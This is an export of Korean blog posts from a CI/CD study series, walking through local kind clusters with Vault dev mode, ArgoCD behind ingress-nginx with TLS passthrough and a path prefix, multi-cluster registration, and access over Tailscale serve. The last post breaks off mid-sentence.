[{"categories":null,"contents":"CloudNet@에서 진행하고 있는 CI/CD Study 7주차에는 Vault를 다루었습니다.\n자세한 설명은 해당 공식 페이지에서 해주고 있지만, 그저 1password 같은 패스워드 관리 서비스가 엔드유저 대상이라면 Vault는 인프라 관리자 대상으로 사용되는 것으로 알고 있는 제게는 흥미로운 주차였습니다.\n이번 스터디에서는 계속해서 kind로 로컬 Kubernetes(k8s)를 활용했기에, 이번에도 비슷하게 배포해보겠습니다.\n0. 실습 환경 준비 - kind 클러스터 배포 해당 구성들은 아래 GitHub에 탑재되어 있습니다.\nhttps://github.com/kkumtree/ci-cd-cloudnet-study 의 7w 폴더\nkind create cluster --name vault --image kindest/node:v1.32.8 --config - \u0026lt;\u0026lt;EOF kind: Cluster apiVersion: kind.x-k8s.io/v1alpha4 nodes: - role: control-plane - role: worker labels: ingress-ready: true extraPortMappings: - containerPort: 80 hostPort: 30080 EOF echo \u0026#34;[Provisoning..] ingress-nginx in vault cluster\u0026#34; kubectl config use-context kind-vault kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/main/deploy/static/provider/kind/deploy.yaml kubectl wait --namespace ingress-nginx \\ --for=condition=ready pod \\ --selector=app.kubernetes.io/component=controller \\ --timeout=90s sudo tailscale serve -bg localhost:30080 kubectl apply -f whoami.yaml 이번에는 UI 관련해서 80포트 하나만 뚫어놓고 사용하고 싶었는데, 뭔가 하나씩 막히는 중입니다. 그래서 traefik/whoami 이미지를 활용하여 디버깅을 하기로 했습니다.\n# cat kind/whoami.yaml apiVersion: v1 kind: Namespace metadata: name: whoami --- apiVersion: apps/v1 kind: Deployment metadata: name: whoami namespace: whoami spec: replicas: 1 selector: matchLabels: app: whoami template: metadata: labels: app: whoami spec: containers: - name: whoami image: traefik/whoami:v1.9.0 ports: - containerPort: 80 --- apiVersion: v1 kind: Service metadata: name: whoami namespace: whoami spec: selector: app: whoami ports: - name: http port: 80 targetPort: 80 --- apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: whoami-ingress namespace: whoami annotations: nginx.ingress.kubernetes.io/rewrite-target: \u0026#34;/$1\u0026#34; nginx.ingress.kubernetes.io/use-regex: \u0026#34;true\u0026#34; spec: ingressClassName: \u0026#34;nginx\u0026#34; rules: - http: # Tailscale serve용 host 제거 paths: - path: /whoami(?:/(.*))? pathType: ImplementationSpecific backend: service: name: whoami port: number: 80 (2) Vault DevMode배포 이번에는\n❯ cat vault-server.sh #!/bin/bash helm repo add hashicorp https://helm.releases.hashicorp.com # vault-values-dev.yaml 생성 cat \u0026lt;\u0026lt;EOF \u0026gt; vault-values-dev.yaml global: enabled: true tlsDisable: true injector: enabled: true # Sidecar Injection을 위해 필요한 설정 server: ingress: enabled: true annotations: nginx.ingress.kubernetes.io/ssl-redirect: \u0026#34;false\u0026#34; nginx.ingress.kubernetes.io/force-ssl-redirect: \u0026#34;false\u0026#34; # nginx.ingress.kubernetes.io/rewrite-target: \u0026#34;/\\$1\u0026#34; # nginx.ingress.kubernetes.io/use-regex: \u0026#34;true\u0026#34; ingressClassName: \u0026#34;nginx\u0026#34; hosts: - host: kkumtree-ms-7a34.panda-ule.ts.net paths: - / dev: enabled: true devRootToken: \u0026#34;root\u0026#34; dataStorage: enabled: false tls: [] service: enabled: true type: \u0026#34;ClusterIP\u0026#34; ui: enabled: true serviceType: \u0026#34;ClusterIP\u0026#34; activeVaultPodOnly: true EOF helm upgrade vault hashicorp/vault -n vault -f vault-values-dev.yaml --install --create-namespace Root path 안써보고 싶어서 갖은 궁리를 해봤지만, 생각보다 안되었습니다.\nserver: ingress: annotations: nginx.ingress.kubernetes.io/rewrite-target: \u0026#34;/\\$1\u0026#34; nginx.ingress.kubernetes.io/use-regex: \u0026#34;true\u0026#34; hosts: - host: kkumtree-ms-7a34.panda-ule.ts.net paths: - /_vault(?:/(.*))? 원래는 위와 같이 하고 싶었는데, 어쩔 수 없이 루트 경로에서 진행했습니다.\n# kubectl get ingress -A -o json | \\ jq \u0026#39;.items[] | {namespace: .metadata.namespace, name: .metadata.name, host: .spec.rules[].host, paths: .spec.rules[].http.paths[].path}\u0026#39; { \u0026#34;namespace\u0026#34;: \u0026#34;vault\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;vault\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;kkumtree-ms-7a34.panda-ule.ts.net\u0026#34;, \u0026#34;paths\u0026#34;: \u0026#34;/\u0026#34; } { \u0026#34;namespace\u0026#34;: \u0026#34;whoami\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;whoami-ingress\u0026#34;, \u0026#34;host\u0026#34;: null, \u0026#34;paths\u0026#34;: \u0026#34;/whoami(?:/(.*))?\u0026#34; } 그러면 위와 같이 경로가 떠서, localhost 일때만 whoami를 접속할 수 있었습니다.\n2. Vault CLI 설치 Terraform을 APT로 설치했다면, 마지막의 vault 설치만 진행하면 됩니다.\n(GPG키 중복 표시됨)\ncurl -fsSL https://apt.releases.hashicorp.com/gpg \\ | sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg echo \u0026#34;deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] \\ https://apt.releases.hashicorp.com $(lsb_release -cs) main\u0026#34; \\ | sudo tee /etc/apt/sources.list.d/hashicorp.list sudo apt-get update -qq \u0026amp;\u0026amp; sudo apt-get install -y vault ","date":"2025-11-30T08:59:34+09:00","permalink":"https://blog.minseong.xyz/post/vault-101-in-kubernetes/","section":"post","tags":["vault","CICD","CloudNet@"],"title":"Vault 101 in Kubernetes - CI/CD 스터디 7주차"},{"categories":null,"contents":"CloudNet@에서 진행하고 있는 CI/CD Study 6주차에는 ArgoCD를 마지막으로 다루었습니다.\nCluster를 추가해보고 Gitea를 붙이기 전에, ArgoCD를 Prefix로 라우팅하려고 했는데 로그아웃하고 나서 원치않는 경로로 빠지는 바람에\n이것저것 살펴보고 수정을 하여 원하는 대로 구동되도록 셋업했습니다.\n0. 실습 준비 해당 구성들은 아래 GitHub에 탑재되어 있습니다.\nhttps://github.com/kkumtree/ci-cd-cloudnet-study 의 6w 폴더\n이전 포스팅 Tailscale을 타고, ArgoCD에 접근해보기을 하였다면, 리소스 정리를 합니다.\nkind 배포 시, 포트 점유로 오류가 발생합니다.\nsudo tailscale serve --tcp 443 off 이후 실습을 위한 배포를 합니다.\n(1) kind 클러스터 배포 이번 실습에서는 k8s 다중 클러스터 환경에서의 ArgoCD를 다루기에,\n총 3개의 클러스터를 배포합니다.\n(6w/shells/kind/)\nup-kind-mgmt.sh 실행 kind 클러스터, mgmt 생성 ingress-nginx 배포 ingress-nginx에 SSL passthrough 활성화 up-kind-dev-prd.sh 실행 kind 클러스터, dev 생성 kind 클러스터, prd 생성 이후 아래 3개의 context를 확인할 수 있습니다.\n(kubectl config get-contexts, k9s의 경우 :ctx)\nkind-mgmt / kind-prd / kind-dev (2) ArgoCD 배포(mgmt) Tailscale 연동이 재밌었기 때문에, 이번엔 이쪽[sol.2]으로 합니다.\n[sol.1] /etc/hosts 파일을 변경하여 접근하도록 하는 방법\n(6w/shells/argocd/)\n9-create-local-tls.sh 실행 deploy-chart.sh 실행 kind-mgmt로 context 전환 ArgoCD 배포 아래처럼 /etc/hosts 파일도 수정하여, 임의의 도메인을 추가합니다.\n# (Mac/Linux) echo \u0026#34;127.0.0.1 argocd.example.com\u0026#34; | sudo tee -a /etc/hosts cat /etc/hosts # (Windows) # C:\\Windows\\System32\\drivers\\etc\\hosts 관리자모드에서 메모장에 내용 추가 # 127.0.0.1 argocd.example.com [sol.2] Tailscale 로 접근하도록 하는 방법\n이전 포스팅 Tailscale을 타고, ArgoCD에 접근해보기을 참고하여 각자의 DNS로 변경 후 실행합니다.\n(6w/shells/tailnet-argocd)\ntailnet에 등록된 해당 hostname 확인: 두 번째 값\ntailscale status | head -n 1 tailnet DNS 확인: Search Domains:의 항목 확인\nsudo tailscale dns status create-local-tls.sh 파일을 확인된 값으로 변경 후, 실행 deploy-chart.sh 파일을 확인된 값으로 변경 후, 실행 kind-mgmt로 context 전환 ArgoCD 배포 이후에 아래 커맨드로 Tailscale serve를 활성화 합니다.\nsudo tailscale serve --bg --tcp 443 tcp://localhost:443 (3) ArgoCD 초기 패스워드 변경 ArgoCD 권장 사항으로 패스워드 변경 후, 초기 패스워드는 제거합니다.\nARGOPW=$(kubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath=\u0026#34;{.data.password}\u0026#34; | base64 -d ;echo) # argocd login argocd.example.com --insecure --username admin --password $ARGOPW argocd login kkumtree-ms-7a34.panda-ule.ts.net --insecure --username admin --password $ARGOPW # 사용자 지정 패스워드로 변경 argocd account update-password --current-password $ARGOPW --new-password kkumtree # (권장) 초기 비밀번호 제거 kubectl delete secret argocd-initial-admin-secret -n argocd 이후, 변경된 패스워드로 로그인을 확인합니다.\n1. ArgoCD 클러스터 관리 ArgoCD가 배포된 클러스터 외의 클러스터들은 별도로 ArgoCD에 등록하여야합니다.\n이에 앞서, kind를 위한 설정과 Alias 등록을 해두겠습니다.\n(1) kind를 위한 설정 및 Alias 등록 kind는 Docker위에서 구동되는 것이기에,\nkind가 사용중인 Docker 네트워크와 Docker 포트포워딩 정보를 확인해야합니다.\n실습 환경 별로, 사용 중인 네트워크 정보는 달라질 수 있습니다.\n또한 호스트 재부팅 시 각 Docker Network내 IP가 변경될 수 있으니, 확인하여 변경하여야 합니다.\n6443 포트를 사용하고 있고 네트워크는 172.16.0.0/16 대역을 사용 중인 것을 확인하였습니다.\ndocker ps docker network inspect kind | grep -E \u0026#39;Name|IPv4Address\u0026#39; 이후, 각 cluster별로 확인된 IP주소로 변경합니다. (vi ~/.kube/config)\nalias kctx-mgmt=\u0026#39;kubectl --context kind-mgmt\u0026#39; alias kctx-dev=\u0026#39;kubectl --context kind-dev\u0026#39; alias kctx-prd=\u0026#39;kubectl --context kind-prd\u0026#39; (2) 클러스터 등록 아래 커맨드를 입력한 다음, y로 승인하여 등록 절차를 밟습니다.\nargocd cluster add kind-dev --name dev-k8s argocd cluster add kind-prd --name prd-k8s 등록이 되었는지 확인해봅니다.\n클러스터의 자격증명은 argocd.argoproj.io/secret-type=cluster과 함께 시크릿으로 저장됩니다.\nkubectl get secret -n argocd -l argocd.argoproj.io/secret-type=cluster argocd cluster list 2. ArgoCD Prefix 재적용 Gitea도 같이 띄우기 위해서, ArgoCD 진입점을 Prefix /_argocd 로 변경을 해보겠습니다.\n추가로 설정한 값은 아래와 같습니다.\n특히, 로그아웃 시 지정한 Prefix로 리디렉션되지 않아 configs.cm.url을 사용자 정의했습니다.\n추정컨대, SSO 설정을 하려면 필수적으로 필요한 값이라 로직상 사소한 버그는 놔둔 것으로 보입니다.\nconfigs.params.server.basehref: \u0026#34;/\u0026lt;Prefix\u0026gt;\u0026#34; # Reverse Proxy 사용 시, 하위 경로가 다를 때 사용. 웹콘솔의 index.html 경로 정의 configs.params.server.rootpath: \u0026lt;Prefix\u0026gt;/ # Reverse Proxy 사용 시, 하위 경로가 다를 때 사용. configs.cm.url: \u0026#34;https://\u0026lt;DOMAIN\u0026gt;/\u0026lt;Prefix\u0026gt;\u0026#34; # Logout 시, ArgoCD 메인페이지로 가지 못하는 이슈가 있어, 수동으로 지정 server.ingress.path: /\u0026lt;/Prefix\u0026gt;/ # 마지막에 `/` 추가하지 않으면 에러발생 확인. server.ingress.pathType: Prefix # ImplementationSpecific로 할 경우, Prefix 뿐만이 아니고 Domain 최상위 경로도 점유하는 것으로 확인 configs 네임스페이스에 정의된 사항은 ConfigMap argocd-cmd-parmas-cm 과 argocd-cm 에서 확인할 수 있습니다.\nkubectl get cm -n argocd kubectl describe cm/argocd-cmd-params-cm -n argocd | grep -E \u0026#39;server.basehref|server.rootpath\u0026#39; -A 2 네임스페이스 argocd 제거 deploy-chart-prefix.sh 실행 (로컬 TLS 인증서 없는 경우, 생성 후 진행) 명령어로 지정한 Prefix로 정상 접근되는 지 점검: Prefix 마지막에 / 추가 이후, 로그인 재설정 및 클러스터 재등록을 진행했습니다. 하지만, 네임스페이스를 지우면 TLS 인증서와 cluster 등록을 반복했어야 해서\n디버깅 중에는 helm 업그레이드로 진행했습니다.\nhelm upgrade argocd -n argocd argo/argo-cd --values argocd-values-tailnet-prefix.yaml 아래 명령어로 정상 접근되는지 확인합니다.\n# curl -k https://\u0026lt;DOMAIN\u0026gt;/\u0026lt;Prefix\u0026gt;/ curl -k https://kkumtree-MS-7A34.panda-ule.ts.net/_argocd/ 로그인 시에는 다음과 같이 --grpc-web-root-path /\u0026lt;Prefix\u0026gt; 파라미터를 추가하여 접속합니다.\n# ARGOPW=$(kubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath=\u0026#34;{.data.password}\u0026#34; | base64 -d ;echo) argocd login kkumtree-ms-7a34.panda-ule.ts.net --grpc-web-root-path /_argocd --insecure --username admin --password $ARGOPW # argocd account update-password --current-password $ARGOPW --new-password kkumtree argocd login kkumtree-ms-7a34.panda-ule.ts.net --grpc-web-root-path /_argocd --insecure --username admin --password kkumtree # kubectl delete secret argocd-initial-admin-secret -n argocd 9. Host 재부팅 시, Unhandled Error 재부팅 후 kubectl 명령어 입력 시 kind 클러스터, 즉 Docker pod의 Docker network 상의 IP주소가 변경되므로 1-(1) kind를 위한 설정 및 Alias 등록을 참조하여 ~/.kube/config 설정을 업데이트 합니다.\n더불어 ArgoCD 클러스터도 재등록 해야합니다.\n기존 클러스터 제거: argocd cluster rm \u0026lt;CLUSTER NAME\u0026gt; Reference argocd-cmd-params-cm.yaml/GitHub url in argocd-cm.yaml/GitHub logoutRedirectURL in logout.go ","date":"2025-11-22T20:56:43+09:00","permalink":"https://blog.minseong.xyz/post/argocd-cluster-management-and-prefix/","section":"post","tags":["argocd","CICD","CloudNet@"],"title":"ArgoCD Cluster 및 Prefix 관리 - CI/CD 스터디 6주차"},{"categories":null,"contents":"이전 게시물, ArgoCD with Ingress의 도메인 설정을 하다가 문득, Tailscale의 serve기능을 활용하여 Tailscale 내부 네트워크(이하, tailnet)에서만 접근 가능한 ArgoCD 서버를 구축하면 되지 않을까? 하여 구성해보았습니다.\nkind를 운용 중인 Host와 접속할 Client들에 Tailscale 설치되어 있어야합니다.\n1. Tailscale과 Serve 전통적인 중앙집중식(Hub-Spoke) VPN이 아래와 같다면,\nTailscale의 경우, Mesh 네트워크의 형태를 가지며 Wireguard를 활용합니다.\n구분 전통적 중앙집중식 VPN Tailscale (메쉬 VPN) 네트워크 구조 중앙 서버를 통한 모든 트래픽 경유​ P2P 직접 연결, 분산형 메쉬 네트워크​ 데이터 경로 클라이언트 → VPN 서버 → 목적지​ 클라이언트 → 목적지 (직접 연결)​ 프로토콜 OpenVPN(TCP/UDP), IKEv2, L2TP WireGuard(UDP 기반) 성능 중앙 서버 병목 발생, 지연 증가​ 직접 연결로 지연 최소화, 빠른 속도 설정 복잡도 서버 구축, 포트 포워딩 필요​ 로그인만으로 즉시 사용 가능​ NAT 통과 수동 포트 포워딩 필요​ 자동 NAT Traversal 지원 확장성 서버 용량에 따라 제한​ 각 노드 독립적, 확장 용이 보안 중앙 서버가 모든 트래픽 확인 가능​ 종단 간 암호화, P2P 전송​ Tailscale의 serve와 같은 경우는, ngrok의 기본 기능과 유사한 funnel과 달리\ntailnet에 속한 기기만 접근이 가능합니다.\n2. Tailscale의 상태확인 kind(Kubernetes)를 구동 중인, 데스크톱에서 상태를 확인합니다.\ntailscale status 7A34로 끝나는 장비에서 kind를 구동 중이며 online/offline 대신 해당 장치에서 확인 중이기에,\n-(하이픈)으로 표시됨을 알 수 있습니다.\n또한, Tailscale에서 제공하는 DNS도 확인합니다.\nsudo tailscale dns status 3. 인증서 재생성 및 ArgoCD 재배포 이전 게시물의 1. TLS 활성화 ArgoCD 배포 부분부터 해당 부분을 적용해보겠습니다.\n해당 구성들은 아래 GitHub에 탑재되어 있습니다.\nhttps://github.com/kkumtree/ci-cd-cloudnet-study 의 5w/shells/tailnet 폴더\n(1) 인증서 생성 create-local-crt.sh에서 확인된 도메인으로 수정 후 실행하여,\n로컬의 openssl-x509-output폴더에 인증서를 생성해두었습니다.\n(keyout 및 out은 각 파일의 구분 용이를 위한 것이며, subj의 CN이 중요합니다.)\n전체 DNS는 \u0026lt;Tailscale에서 식별된 Hostname\u0026gt;.\u0026lt;DNS주소\u0026gt;\n# create-local-crt.sh openssl req -x509 -nodes -days 365 -newkey rsa:2048 \\ -keyout openssl-x509-output/kkumtree-ms-7a34.panda-ule.ts.net.key \\ -out openssl-x509-output/kkumtree-ms-7a34.panda-ule.ts.net.crt \\ -subj \u0026#34;/CN=kkumtree-ms-7a34.panda-ule.ts.net/O=kkumtree\u0026#34; (2) ArgoCD 재배포 기존에 ArgoCD가 배포되어있기에 네임스페이스 째로 삭제를 먼저 진행했습니다.\nkubectl delete ns argocd deploy-chart.sh 파일에서 해당되는 도메인과 생성된 키로 값을 변경한 뒤, 배포하였습니다.\n#!/bin/bash kubectl create ns argocd # confirm cert and key is available in the path kubectl -n argocd create secret tls argocd-server-tls \\ --cert=openssl-x509-output/kkumtree-ms-7a34.panda-ule.ts.net.crt \\ --key=openssl-x509-output/kkumtree-ms-7a34.panda-ule.ts.net.key # https://github.com/argoproj/argo-helm/blob/main/charts/argo-cd/values.yaml cat \u0026lt;\u0026lt;EOF \u0026gt; argocd-values-tailnet.yaml global: domain: kkumtree-ms-7a34.panda-ule.ts.net # # TLS certificate configuration via cert-manager # # cert-manager가 있을 때, 활용. # certificate: # enabled: true server: ingress: enabled: true ingressClassName: nginx annotations: nginx.ingress.kubernetes.io/force-ssl-redirect: \u0026#34;true\u0026#34; nginx.ingress.kubernetes.io/ssl-passthrough: \u0026#34;true\u0026#34; nginx.ingress.kubernetes.io/backend-protocol: \u0026#34;HTTPS\u0026#34; tls: true EOF # https://github.com/argoproj/argo-helm/tree/main/charts/argo-cd#installing-the-chart helm repo add argo https://argoproj.github.io/argo-helm # https://github.com/argoproj/argo-helm/releases helm install argocd argo/argo-cd --version 9.0.5 -f argocd-values-tailnet.yaml --namespace argocd 다만, 차트 배포 시 ArgoCD 서버는 자체 TLS인증서를 쓰기로 설정되었기 때문에 위의 코드처럼, Tailscale을 위한 추가 어노테이션 설정이 필요합니다.\nserver: ingress: annotations: nginx.ingress.kubernetes.io/backend-protocol: \u0026#34;HTTPS\u0026#34; 그렇지 않으면 ingress 로그를 까봤을 때, 307 redirect 에러가 납니다.\n4. Tailscale serve 실행 sudo tailscale serve --bg --tcp 443 tcp://localhost:443 sudo tailscale serve status 5. 접속 확인 이제 해당 네트워크에서 제대로 접속되는 것을 알 수 있습니다.\n동일 Tailnet에 속한 휴대전화로 해당 도메인에 접근가능한 것을 확인할 수 있습니다.\n(Mac/Linux)\nTailscale에 대한 DNS파일(/etc/resolv.conf)이 깨졌을 경우에는 재기동을 합니다.\nsudo tailscale down sudo tailscale up 9. Tailscale serve 종료 실습을 마쳤다면, 종료하여 해당 포트를 반납합니다.\nsudo tailscale serve --tcp 443 off Reference tailscale serve command Ingress Configuration - ArgoCD / kubernetes/ingress-nginx ","date":"2025-11-17T10:23:03+09:00","permalink":"https://blog.minseong.xyz/post/playing-argocd-with-tailscale/","section":"post","tags":["tailscale","argocd","CloudNet@"],"title":"Tailscale을 타고, ArgoCD에 접근해보기"},{"categories":null,"contents":"CloudNet@에서 진행하고 있는 CI/CD Study 5주차에는 ArgoCD를 좀더 다루었습니다.\n0. 실습 준비 해당 구성들은 아래 GitHub에 탑재되어 있습니다. https://github.com/kkumtree/ci-cd-cloudnet-study 의 5w 폴더\n우선 80/443 포트를 사용할 수 있는지 확인하여야합니다. 아닌 경우, 다른 포트를 사용해야합니다.\n실제로 해보았을 경우 tailscale이 포트를 사용하는 것으로 오인하여 해당 서비스를 중지해보았습니다.\n다만, 단순히 kind YAML을 잘못 작성한 것으로 보입니다.\n(1) kind 및 kube-ops-view 이번에는 Ingress의 배포를 하기 위한 밑작업으로\nControl Node에 라벨링을 진행합니다.\n이는 다음에 이어질 ingress-nginx 배포 시, nodeSeletor 조건으로 사용합니다.\n# 5w/shells/kind/up-kind.sh kind: Cluster apiVersion: kind.x-k8s.io/v1alpha4 # networking: # apiServerAddress: \u0026#34;0.0.0.0\u0026#34; nodes: - role: control-plane labels: ingress-ready: true extraPortMappings: - containerPort: 80 hostPort: 80 protocol: TCP - containerPort: 443 hostPort: 443 protocol: TCP - containerPort: 30000 hostPort: 30000 - containerPort: 30001 hostPort: 30001 - containerPort: 30002 hostPort: 30002 - containerPort: 30003 hostPort: 30003 - role: worker kube-ops-view의 경우에는, 기존과 같습니다.\n# kube-ops-view helm repo add geek-cookbook https://geek-cookbook.github.io/charts/ helm install kube-ops-view geek-cookbook/kube-ops-view --version 1.2.2 --set service.main.type=NodePort,service.main.ports.http.nodePort=30001 --set env.TZ=\u0026#34;Asia/Seoul\u0026#34; --namespace kube-system # kube-ops-view 접속 URL 확인 open \u0026#34;http://127.0.0.1:30001/#scale=2\u0026#34; # 배율 2x 사용자 라벨링 관련하여 문서가 갱신되어 지금은 확인하기가 어렵지만, 기존 문서(issues#2889/kind)에는 아래와 같이 Taint toleration(예외 처리, 허용)을 해주고, 노드에 사용자 라벨링하도록 안내되어 있었다고 합니다.\nThe manifests contains kind specific patches to forward the hostPorts to the ingress controller, set taint tolerations and schedule it to the custom labelled node.\n(2) Ingress Nginx 배포 먼저 Control Node의 라벨을 확인하여, 지정한 사용자 라벨이 정상적으로 있는지 확인합니다.\nkubectl get nodes myk8s-control-plane -o jsonpath={.metadata.labels} | jq # { # \u0026#34;beta.kubernetes.io/arch\u0026#34;: \u0026#34;amd64\u0026#34;, # \u0026#34;beta.kubernetes.io/os\u0026#34;: \u0026#34;linux\u0026#34;, # \u0026#34;ingress-ready\u0026#34;: \u0026#34;true\u0026#34;, # 이 값이 확인되어야 합니다. # \u0026#34;kubernetes.io/arch\u0026#34;: \u0026#34;amd64\u0026#34;, # \u0026#34;kubernetes.io/hostname\u0026#34;: \u0026#34;myk8s-control-plane\u0026#34;, # \u0026#34;kubernetes.io/os\u0026#34;: \u0026#34;linux\u0026#34;, # \u0026#34;node-role.kubernetes.io/control-plane\u0026#34;: \u0026#34;\u0026#34;, # \u0026#34;node.kubernetes.io/exclude-from-external-load-balancers\u0026#34;: \u0026#34;\u0026#34; # } 이후, 배포를 진행합니다.\n해당 YAML에는 kind 배포 시 열어두었던 80/443 포트를 활용하는 것을 확인하였고,\nmaster 및 control-plane에 대한 taint toleration도 확인하였습니다.\n(Deployment 항목) tolerations.[node-role.kubernetes.io/control-plane].effect=NoSchedule\nkubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/main/deploy/static/provider/kind/deploy.yaml ingress 컨트롤러에서 --publish-status-address=localhost 환경변수를 확인할 수 있습니다.\n더불어, Control plane 내에서 IPTABLES도 확인해봅니다.\ningress-nginx 파드에 대한 엔드포인트 IP로 검색했을 때 전달되는 것을 확인하였습니다.\n(3) SSL Passthrough flag 활성화 Argo CD의 경우 OpenSSL의 self-signed 인증서와 Secrets를 생성, 즉 자체 TLS 인증서를 쓰기 때문에\nNginx가 중간에서 TCP 프록시 처리를 하고 HTTPS 트래픽을 종료(TLS Termination)하여 too many redirects 오류가 발생합니다.\n그래서 이 부분도 수정해두도록 하겠습니다.\n# nginx-ingress-controller의 환경변수 체크 kubectl exec -it -n ingress-nginx deployments/ingress-nginx-controller -- /nginx-ingress-controller --help | grep ssl # 에디터를 지정하여 수정 (vi, nano 등) KUBE_EDITOR=\u0026#34;vi\u0026#34; kubectl edit -n ingress-nginx deployments/ingress-nginx-controller spec.template.spec.containers[controller].args에 추가\n이후 Controller 파드의 환경변수 반영을 체크합니다.\n1. TLS 활성화 ArgoCD 배포 방금까지 Client(Browser) -\u0026gt; Ingress -\u0026gt; ArgoCD 서버간 E2E HTTPS가 유지될 수 있는 상황을 만들었으니, 자체 TLS 인증서를 사용하는 ArgoCD를 배포해보겠습니다.\n가상의 도메인으로 argocd.example.com로 정하고,\nArgoCD 서버 annotations에 force-ssl-redirect와 ssl-passthrough를 활성화하였습니다.\n(1) 인증서 생성 5w/shells/argocd 폴더 참조\n9-create-local-crt.sh로 생성한, 인증서는 openssl-crt-file 폴더에 저장.\n설치는 deploy-chart.sh로 진행합니다.\n(단, 이미지의 폴더명 openssl-tls-file 대신, openssl-x509-output으로 변경해두었습니다.)\n# 5w/shells/argocd/argocd-values.yaml global: domain: argocd.example.com # # TLS certificate configuration via cert-manager # # cert-manager가 있을 때, 활용. # certificate: # enabled: true server: ingress: enabled: true ingressClassName: nginx annotations: nginx.ingress.kubernetes.io/force-ssl-redirect: \u0026#34;true\u0026#34; nginx.ingress.kubernetes.io/ssl-passthrough: \u0026#34;true\u0026#34; tls: true 더불어, /etc/hosts 파일도 수정하여, 임의의 도메인을 수정합니다.\n이후에 제대로 되었는지 확인해봐야하는데, ArgoCD 배포 직후에는 바로 반영이 안되고 수 분이 소요됩니다.\n( curl -vk https://argocd.example.com/ 활용)\n웹 브라우저에서 접속을 해보면, 임의로 만들었기 때문에 경고가 나옵니다.\n아래 명령어로 초기 패스워드를 얻고나서 접속해봅니다.\nkubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath=\u0026#34;{.data.password}\u0026#34; | base64 -d ;echo # KALyT84LFFnr5x-J argocd login argocd.example.com --insecure 해당 URL로 웹 콘솔 접속도 잘되고, CLI로도 해당 도메인으로 접근이 잘 됩니다.\n9. kind의 Ingress Controller(NGINX) 구성 이번 실습에서는 kind의 Control plane에 별도의 사용자 지정 라벨링을 하였으나,\nkind 문서(Ingress/kind)에서는\nk8s 공식 라벨 소개하는 2가지 방법이 있습니다.\n특히, 라벨은 kubernetest의 알려진(Well-Known)라벨인 app.kubernetes.io/component을 활용하는 것을 확인하였습니다.\n# Selector로 아래 라벨 활용 확인 # app.kubernetes.io/component=controller kubectl wait --namespace ingress-nginx \\ --for=condition=ready pod \\ --selector=app.kubernetes.io/component=controller \\ --timeout=90s 이후 두 방법을 요약하면, 아래와 같습니다.\n(1) ingress-nginx-controller에 등록된 External IP의 이용\n(관련 YAML파일 다운로드:https://kind.sigs.k8s.io/examples/ingress/deploy-ingress-nginx.yaml)\n(2) kind 배포 시 Control plane에 80/443 포트(extraPortMappings)를 열고, localhost로 이용.\nReference Ingress/kind kind#2889/GitHub Well-Known Labels, Annotations and Taints/Kubernetes ","date":"2025-11-16T17:38:34+09:00","permalink":"https://blog.minseong.xyz/post/argocd-ingress/","section":"post","tags":["argocd","ingress","CICD","CloudNet@"],"title":"ArgoCD with Ingress - CI/CD 스터디 5주차"},{"categories":null,"contents":"CloudNet@에서 진행하고 있는 CI/CD Study 4주차에는 ArgoCD를 다루기 시작했습니다.\nKubernetes(이하, k8s) 상에서 ArgoCD는 Controller보다는 Operator에 가까운 포지션을 갖는다고 하여,\n이번 기회에 실습을 하면서 체감을 하는 것에 목적을 두었습니다.\nController: live state(실제 상태)와 desired state(원하는 상태)가 일치하는지 관찰 및 지속적 조정 Operator: Controller가 k8s 내부 object에서 동작한다면, Operator는 k8s 외의 것들도 다룰 수 있음 해당 구성들은 아래 GitHub에 탑재되어 있습니다.\nhttps://github.com/kkumtree/ci-cd-cloudnet-study 의 4w 폴더\n0. 실습 준비 이전 게시물, Jenkins, git and kubernetes의 kind 및 kube-ops-view 설정과 동일하여 생략합니다.\n실습 코드: PacktPublishing/ArgoCD-in-Practice 1. 명령형/선언형 방식 명령형(imperative): 절차적 방식, 명령어를 순서대로 적용.\nk8s에서는 kubectl create/replace 선언형(declarative): 파일을 통해 생성하고, 수정 후 업데이트/동기화.\nk8s에서는 kubectl apply (신규/수정 동일) Packt 출판사의 실습코드를 통해 기본적인 동작을 살펴봅니다.\n# ArgoCD-in-Practice/ch01/basic-gitops-operator cd ch01 tree basic-gitops-operator-config # 배포할 manifest 파일 tree basic-gitops-operator # tmp 폴더를 생성하고, 클러스터에 적용할 manifest을 관리 basic-gitops-operator go run main.go main.go 파일은 tmp 폴더를 생성하고, 5초 주기로 해당 매니페스트를 동기화하는 소스코드임을 확인했습니다.\n첫번째 루프에서는 nginx 배포를 위한 namespace(이하, NS)랑 deployment를 동시에 생성 시도하였으나, 해당 ns가 생성완료 되기도 전에 선언된 deployment를 생성하려다 실패. 5초 후 두번째 루프에서는 이전 루프에서 실패한 deployment를 마저 배포 성송. 이후에도 연속적으로 5초 마다 상태를 동기화를 시도하는 것을 볼 수 있었습니다. 아래 커맨드로 nginx deployment를 삭제하였어도,\n오퍼레이터는 5초 후에 매니페스트와 비교하여 재배포하는 것을 확인할 수 있었습니다. deployment.apps/nginx created\n# 새로운 터미널에서 kubectl get deployment,pod -n nginx kubectl delete deployment nginx -n nginx kubectl get deployment,pod -n nginx # 재배포된 것을 확인 이후 환경 정리를 위해, 오퍼레이터 코드를 중단하고 해당 NS를 삭제합니다.\nkubectl delete ns nginx # namespace \u0026#34;nginx\u0026#34; deleted 2. ArgoCD ArgoCD는 k8s 환경에서 GitOps 방식의 배포를 위한 도구들 중 하나입니다.\nGit repository 내에, 앞서 알아보았던 Helm 101 게시물에서 다뤘던 Helm 차트 등의 템플릿을\nk8s yaml 매니페스트로 변환하여 배포하는 도구로 정리될 수 있습니다.\n더불어, 앞서 명령형/선언형 방식에서 살펴본 오퍼레이터와 같이, kubectl apply 즉, 선언전 도구라는 점도 참고하면 좋습니다.\n(1) Multi-Cluster 사용 시 kind를 배포하면, ~/.kube/config 파일에 단일 클러스터 정보를 얻고 관리할 수 있듯이\n각 k8s 클러스터는 고유한 토큰을 통해 접근, 관리할 수 있기 때문에, ArgoCD 가 설치된 Cluster 외의 다른 Cluster에 접근할 권한을 